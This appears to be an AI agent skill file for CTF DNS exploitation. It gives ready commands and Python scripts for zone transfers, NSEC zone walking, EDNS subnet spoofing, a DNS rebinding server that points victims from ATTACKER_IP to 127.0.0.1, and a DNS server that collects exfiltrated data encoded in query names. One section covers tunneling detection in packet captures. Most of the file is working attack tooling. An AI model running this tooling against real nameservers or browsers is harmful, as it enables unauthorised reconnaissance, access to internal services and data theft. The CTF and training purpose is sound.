---
name: misc-dns
description: "CTF DNS exploitation. EDNS Client Subnet spoofing for geo-specific responses, DNSSEC NSEC zone walking, IXFR incremental zone transfer for deleted records, DNS rebinding, DNS tunneling detection in PCAP, custom DNS server with dnslib. Triggers: 'dns ctf', 'dnssec walking', 'zone transfer', 'nsec', 'dns rebinding', 'dns tunneling', 'edns', 'axfr', 'dns exfiltration', 'ixfr'."
---

# CTF Misc: DNS Exploitation

Zone walking, zone transfers, rebinding, tunneling, custom DNS server.

---

## Phase 1: Zone Transfer (AXFR/IXFR)

```bash
TARGET_NS="ns1.target.com"
ZONE="target.com"

# Standard AXFR:
dig axfr "$ZONE" @"$TARGET_NS"
host -l "$ZONE" "$TARGET_NS"

# Incremental IXFR (reveals historical/deleted records):
dig ixfr=0 "$ZONE" @"$TARGET_NS"
# Serial=0 requests full zone history → deleted records may contain flag fragments

# Parse all records:
dig axfr "$ZONE" @"$TARGET_NS" | grep -v "^;" | sort
```

---

## Phase 2: DNSSEC NSEC Zone Walking

```bash
# NSEC: "Next Secure": points from one name to the next
# Chain all NSEC records → full zone enumeration

# Manual NSEC walk:
TARGET_NS="ns1.target.com"
ZONE="target.com"

walk_zone() {
  local current="$ZONE"
  local seen=()
  
  while true; do
    result=$(dig +dnssec nsec "$current" @"$TARGET_NS" | grep "NSEC")
    next=$(echo "$result" | awk '{print $5}')
    echo "Found: $current → $next"
    
    # If next == zone apex → done
    if [ "$next" = "$ZONE." ] || [ "$next" = "$current" ]; then
      break
    fi
    current="$next"
    
    # Safety limit:
    if [ ${#seen[@]} -gt 1000 ]; then
      echo "Too many records"
      break
    fi
  done
}
walk_zone

# Automated: ldns-walk (from ldnsutils):
sudo apt-get install ldnsutils
ldns-walk "@$TARGET_NS" "$ZONE"

# Python nsec walker:
pip install dnspython --break-system-packages
python3 << 'EOF'
import dns.resolver, dns.query, dns.rdatatype

ZONE = 'target.com'
NS = '8.8.8.8'

def nsec_walk(zone, ns):
    current = zone
    names = set()
    
    while True:
        try:
            q = dns.message.make_query(current, dns.rdatatype.NSEC)
            q.use_edns(ednsflags=dns.flags.DO)
            r = dns.query.udp(q, ns, timeout=5)
            
            for rrset in r.answer:
                if rrset.rdtype == dns.rdatatype.NSEC:
                    names.add(str(rrset.name))
                    next_name = str(rrset[0].next)
                    print(f"{rrset.name} → {next_name}")
                    if next_name in names or next_name == zone + '.':
                        return names
                    current = next_name
        except Exception as e:
            print(f"Error: {e}")
            break
    
    return names

print(nsec_walk(ZONE, NS))
EOF
```

---

## Phase 3: EDNS Client Subnet Spoofing

```bash
# Some DNS responses differ based on client geographic location
# EDNS Client Subnet (ECS): lets you spoof source subnet

TARGET_NS="ns1.target.com"
HOST="target.com"

# Try leet-speak subnets:
for subnet in "10.13.37.0/24" "13.37.0.0/16" "1.3.3.7/32"; do
  echo "Testing subnet: $subnet"
  dig +subnet="$subnet" "$HOST" @"$TARGET_NS" | grep -v "^;"
done

# Standard internal subnets:
for subnet in "10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16"; do
  result=$(dig +subnet="$subnet" "$HOST" @"$TARGET_NS" | grep -A1 "ANSWER SECTION")
  echo "Subnet $subnet: $result"
done
```

---

## Phase 4: DNS Rebinding

```bash
# DNS rebinding: same hostname resolves to different IP over time
# Bypass same-origin policy → access localhost from external page

# Existing services:
# rbndr.us: A.B.rbndr.us alternates between IP A and IP B
# singularity.me: configurable DNS rebinding

# Example: access localhost:3000:
# 1. Set up rbndr.us subdomain: ATTACKER_IP.127-0-0-1.rbndr.us
# 2. Load page from browser with DNS TTL=0
# 3. Browser caches first resolution (ATTACKER_IP)
# 4. Attacker page makes XMLHttpRequest to same-origin
# 5. DNS rebinds to 127.0.0.1 → browser sends request to localhost

# Custom DNS server for rebinding:
pip install dnslib --break-system-packages

python3 << 'EOF'
from dnslib import *
from dnslib.server import DNSServer, BaseResolver
import threading, time

class RebindResolver(BaseResolver):
    def __init__(self, external_ip, internal_ip, target_host):
        self.external = external_ip
        self.internal = internal_ip
        self.target = target_host
        self.hit_count = {}
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        self.hit_count[qname] = self.hit_count.get(qname, 0) + 1
        
        reply = request.reply()
        if self.hit_count[qname] <= 1:
            # First resolution: external IP
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.external), ttl=0))
        else:
            # Rebind to internal:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(self.internal), ttl=0))
        
        return reply

resolver = RebindResolver('ATTACKER_IP', '127.0.0.1', 'rebind.attacker.com')
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start_thread()
print("DNS rebinding server running on port 53")
input("Press Enter to stop...")
server.stop()
EOF
```

---

## Phase 5: DNS Tunneling Detection

```bash
# DNS tunneling in PCAP:
tshark -r capture.pcap -Y "dns" -T fields \
  -e frame.time -e ip.src -e dns.qry.name -e dns.resp.name \
  | head -50

# Detect tunneling patterns:
# - Very long subdomain labels (>63 chars)
# - Base32/64 encoded subdomains
# - High query frequency from one host
# - Unusual TXT/NULL record types

# Extract TXT record content:
tshark -r capture.pcap -Y "dns.resp.type == 16" \
  -T fields -e dns.txt | sort | uniq

# Long subdomains (possible data exfil):
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name \
  | awk '{ if (length($1) > 50) print length($1), $1 }' | sort -rn

# Decode base32 subdomain:
echo "MNXW2YLNMVXHI4TBNZXHK4TNFXHG==" | base32 -d
```

---

## Phase 6: Custom DNS Server for CTF

```python
from dnslib import *
from dnslib.server import DNSServer, BaseResolver

class FlagResolver(BaseResolver):
    """Custom DNS server to receive flag exfiltration via DNS queries."""
    
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        print(f"Query: {qname} from {handler.client_address[0]}")
        
        # Decode flag from subdomain:
        parts = qname.rstrip('.').split('.')
        for part in parts:
            try:
                import base64
                decoded = base64.b64decode(part + '==').decode()
                if any(c in decoded for c in 'flag{ctf'):
                    print(f"FLAG FRAGMENT: {decoded}")
            except:
                pass
        
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A('127.0.0.1'), ttl=1))
        return reply

server = DNSServer(FlagResolver(), port=5353, address='0.0.0.0')
server.start_thread()
print("Listening on port 5353...")
input("Ctrl+C to stop")
```

---

## Output

Save to `.omop/engagement/ctf/misc/dns/`:
- `zone-records.txt`: enumerated zone
- `flag.txt`: found flag

## Next Phase

→ `recon-cloud-assets` for DNS-based cloud discovery
→ `pentest-recon` for full reconnaissance
